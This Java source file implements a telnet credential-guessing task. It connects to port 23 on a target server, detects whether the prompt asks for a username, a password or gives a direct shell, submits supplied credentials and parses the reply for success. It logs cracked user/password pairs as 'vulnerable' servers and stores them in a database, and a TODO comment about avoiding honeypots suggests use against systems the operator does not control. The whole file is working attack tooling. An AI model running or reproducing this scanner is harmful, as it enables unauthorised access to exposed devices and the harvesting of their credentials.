package com.company.Tasks;

import com.company.Constants.TelnetAuthResultTypes;
import com.company.Constants.Config;
import com.company.Constants.TelnetLoginTypes;
import com.company.Constants.ProtocolErrorTypes;
import com.company.Constants.Statistics;
import com.company.Helpers.TalkerHelper;
import com.company.Models.Vulnerable;
import com.company.Threads.ReporterThread;
import org.apache.commons.net.telnet.TelnetClient;

import java.io.InputStream;
import java.io.PrintStream;
import java.sql.Timestamp;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;

// TODO: Avoid honeypot (see logfile).
public class AutoTelnetClientTask implements Callable {

    private String server;
    private String user;
    private String pass;
    private String className;

    private InputStream in;
    private PrintStream out;

    private TelnetClient telnet;
    private TalkerHelper talkerHelper;
    private ExecutorService executor;

    public AutoTelnetClientTask(String server, String user, String pass, ExecutorService executor)
    {
        this.server = server;
        this.user = user;
        this.pass = pass;

        this.telnet = new TelnetClient();
        this.talkerHelper = TalkerHelper.getInstance();
        this.className = AutoTelnetClientTask.class.getSimpleName();
        this.executor = executor;
    }

    @Override
    public Object call() throws Exception {

        // Call main function
        this.process();

        return null;
    }

    /**
     * Main function
     */
    private void process()
    {
        try{
            // Set password blank if password = none
            if(pass.equals("none"))
            {
                this.pass = "";
            }

            telnet.connect(server, 23);

            // Set SO timeout
            telnet.setSoTimeout(Config.THREAD_TELNET_LATENCY);

            // Get input and output stream references
            in = telnet.getInputStream();
            out = new PrintStream(telnet.getOutputStream());

            // Detect login type
            TelnetLoginTypes loginType = this.detectLogin();

            if(loginType == TelnetLoginTypes.USERNAME)
            {
                this.talkerHelper.talkInfo(className,Config.MESSAGE_PREDICATE_TELNET + "Detected username authentication for " + server);
                this.authUsername(loginType);
            } else if(loginType == TelnetLoginTypes.PASSWORD){
                this.talkerHelper.talkInfo(className,Config.MESSAGE_PREDICATE_TELNET + "Detected password authentication for " + server);
                this.authPassword(loginType);
            } else if(loginType == TelnetLoginTypes.DIRECT_SHELL) {
                this.talkerHelper.talkInfo(className,Config.MESSAGE_PREDICATE_TELNET + "Detected direct shell " + server);
                this.handleAuthResult(TelnetAuthResultTypes.DIRECT_SHELL, loginType);
            } else if(loginType == TelnetLoginTypes.UNKNOWN){
                this.talkerHelper.talkGreatError(className,Config.MESSAGE_PREDICATE_TELNET + "Undetected authentication for " + server + ". Aborting.");
                // Statistics
                Statistics.totalUnknownTelnetAuth++;
                this.handleShutdown(false);
                return;
            } else if(loginType == TelnetLoginTypes.UNKNOWN_BUT_PROMPT){
                this.authUsername(loginType); // Handle unknown prompt as username login
                this.talkerHelper.talkGreatError(className,Config.MESSAGE_PREDICATE_TELNET + "Undetected authentication for " + server + " but detected prompt.");
            } else if (loginType == TelnetLoginTypes.CONNECTION_REFUSED) {
                return;
            }

        }
        catch (Exception e)
        {
            talkerHelper.talkJavaError(this.className, e, ProtocolErrorTypes.TELNET);
        }
    }

    /**
     * Exhausts message and returns it.
     *
     * @return
     */
    private String exhaustAndRetrieveMessage()
    {
        int exhaustionCounter = 0;
        String message = "";

        for(;;)
        {
            try{

                if(in.available() <= 0)
                {
                    exhaustionCounter++;

                    if(exhaustionCounter > 2)
                    {
                        return message.toLowerCase();
                    }
                }

                // Add character to message
                char m = (char)in.read();
                message += String.valueOf(m);

            } catch (Exception e)
            {
                talkerHelper.talkJavaError(this.className, e, ProtocolErrorTypes.TELNET);
            }
        }
    }

    /**
     * Detect the login method of telnet server.
     */
    private TelnetLoginTypes detectLogin() {
        String message = exhaustAndRetrieveMessage();

        String[] usernameTypeWords = {"user:", "login:", "username:"};
        String[] passwordTypeWords = {"password:"};
        char[] directShellCharacters = {'#', '$'};

        // Check if server sends closing character
        if(message.equals("\uFFFF\uFFFF"))
        {
            this.talkerHelper.talkGreatError(className,Config.MESSAGE_PREDICATE_TELNET + "Connection refused for server " + server + ". Aborting.");

            // Statistics
            Statistics.totalTelnetConnectionRefused++;

            // Shutdown executor
            executor.shutdownNow();
            return TelnetLoginTypes.CONNECTION_REFUSED;
        }

        for (char directShellCharacter : directShellCharacters) {
            if (message.endsWith(String.valueOf(directShellCharacter)) || message.endsWith(directShellCharacter + " ")) {
                return TelnetLoginTypes.DIRECT_SHELL;
            }
        }
        for (String usernameTypeWord : usernameTypeWords) {
            if (message.contains(usernameTypeWord)) {
                return TelnetLoginTypes.USERNAME;
            }
        }
        for (String passwordTypeWord : passwordTypeWords) {
            if (message.contains(passwordTypeWord)) {
                return TelnetLoginTypes.PASSWORD;
            }
        }

        if (message.endsWith(":") || message.endsWith(": "))
        {
            return TelnetLoginTypes.UNKNOWN_BUT_PROMPT;
        }

        return TelnetLoginTypes.UNKNOWN;
    }

    /**
     * Checks if the response contains a success or unsuccessful response
     */
    private TelnetAuthResultTypes checkAuthTry()
    {
        String message = this.exhaustAndRetrieveMessage();

        String[] failWords = new String[]{"fail", "incorrect", "invalid", "not correct", "try again"};
        String[] successWords = new String[]{"welcome", "hello", "success"};
        char[] shellChars = new char[]{'>', '#', '$'};

        for(String failWord : failWords)
        {
            if(message.contains(failWord))
            {
                return TelnetAuthResultTypes.FAILURE;
            }
        }
        for(String succesWord : successWords)
        {
            if(message.contains(succesWord))
            {
                return TelnetAuthResultTypes.SUCCESS;
            }
        }
        for(char shellChar : shellChars)
        {
            if(message.endsWith(String.valueOf(shellChar)) || message.endsWith(shellChar + " "))
            {
                return TelnetAuthResultTypes.DIRECT_SHELL;
            }
        }

        return TelnetAuthResultTypes.UNKNOWN;
    }

    /**
     * Handles username authentication
     */
    private void authUsername(TelnetLoginTypes loginType)
    {
        try {
            write(user);
            Thread.sleep(2000);
            write(pass);
            Thread.sleep(2000);

            TelnetAuthResultTypes authType = checkAuthTry();
            handleAuthResult(authType, loginType);


        } catch (InterruptedException e) {
            talkerHelper.talkJavaError(this.className, e, ProtocolErrorTypes.TELNET);
        }
    }

    /**
     * Handles password authentication
     * @param loginType
     */
    private void authPassword(TelnetLoginTypes loginType)
    {
        try {
            write(pass);
            Thread.sleep(2000);

            TelnetAuthResultTypes authType = checkAuthTry();
            handleAuthResult(authType, loginType);

        } catch (InterruptedException e) {
            talkerHelper.talkJavaError(this.className, e, ProtocolErrorTypes.TELNET);
        }
    }

    /**
     * Performs an action based on the authentication result
     */
    private void handleAuthResult(TelnetAuthResultTypes authType, TelnetLoginTypes loginType)
    {
        // Special case
        if(loginType == TelnetLoginTypes.DIRECT_SHELL)
        {
            talkerHelper.talkGreatSuccess(className, Config.MESSAGE_PREDICATE_TELNET + "<"+ loginType +"> " +"Telnet server " + server + " authentication WITHOUT credentials " + user + "/" + pass + " succeeded (direct shell)!");
            this.handleShutdown(true);

            // Statistics
            Statistics.totalTelnetNoAuthDirectShell++;

        }

        // Default auth types
        if(authType == TelnetAuthResultTypes.SUCCESS)
        {
            // Statistics
            Statistics.totalVulnerableTelnetServer++;

            talkerHelper.talkGreatSuccess(className, Config.MESSAGE_PREDICATE_TELNET + "<"+ loginType +"> " +"Telnet server " + server + " authentication with credentials " + user + "/" + pass + " succeeded!");
            this.handleShutdown(true);
        } else if(authType == TelnetAuthResultTypes.FAILURE)
        {
            talkerHelper.talkGreatError(className, Config.MESSAGE_PREDICATE_TELNET + "<"+ loginType +"> " +"Telnet server " + server + " authentication with credentials " + user + "/" + pass + " failed!");

        } else if(authType == TelnetAuthResultTypes.DIRECT_SHELL)
        {
            // Statistics
            Statistics.totalVulnerableTelnetServer++;

            talkerHelper.talkGreatSuccess(className, Config.MESSAGE_PREDICATE_TELNET + "<"+ loginType +"> " +"Telnet server " + server + " authentication with credentials " + user + "/" + pass + " succeeded (direct shell)!");
            this.handleShutdown(true);
        } else if(authType == TelnetAuthResultTypes.UNKNOWN) {
            talkerHelper.talkGreatError(className, Config.MESSAGE_PREDICATE_TELNET + "<"+ loginType +"> " +"Telnet server " + server + " authentication with credentials " + user + "/" + pass + " potentially failed, unknown auth response!");
        }
    }

    /**
     * Writes value to telnet socket
     * @param value
     */
    private void write(String value) {
        try {
            out.println(value);
            out.flush();
        } catch (Exception e) {
            talkerHelper.talkJavaError(this.className, e, ProtocolErrorTypes.TELNET);
        }
    }

    /**
     * Close all threads when succesful result has been found
     */
    private void handleShutdown(boolean success) {

        if(success)
        {
            this.sendToReporter();

            talkerHelper.talkGreatDebug(className, Config.MESSAGE_PREDICATE_TELNET + "Result has been found, closing remaining threads for server " + server + ".");
        }
        else
        {
            talkerHelper.talkGreatDebug(className, Config.MESSAGE_PREDICATE_TELNET + "Unknown auth type, closing remaining threads for server " + server + ".");
        }

        // Close executor from within thread
        executor.shutdownNow();
    }

    /**
     * Send details to reporter
     */
    private void sendToReporter()
    {
        Vulnerable vulnerable = new Vulnerable(server, user, pass, "TELNET", new Timestamp(System.currentTimeMillis()));

        // Start reporter thread to save into DB
        new Thread(new ReporterThread(vulnerable)).start();
    }

}
